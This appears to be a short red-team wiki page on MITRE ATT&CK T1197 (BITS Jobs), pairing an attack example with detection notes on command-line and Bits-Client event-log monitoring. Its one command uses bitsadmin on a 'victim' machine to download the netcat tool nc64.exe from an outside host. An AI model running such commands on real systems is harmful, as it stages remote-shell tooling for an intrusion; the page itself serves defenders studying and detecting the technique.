---
description: File upload to the compromised system.
---

# T1197: BITS Jobs

## Execution

{% code-tabs %}
{% code-tabs-item title="attacker@victim" %}
```c
bitsadmin /transfer myjob /download /priority high http://10.0.0.5/nc64.exe c:\temp\nc.exe
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../.gitbook/assets/bits-download.png)

## Observations

Commandline arguments monitoring:

![](../.gitbook/assets/bits-cmdline.png)

`Application Logs > Microsoft > Windows > Bits-Client > Operational` shows logs related to jobs, which you may want to monitor. An example of one of the jobs:

![](../.gitbook/assets/bits-operational-logs.png)

{% embed url="https://attack.mitre.org/wiki/Technique/T1197" %}

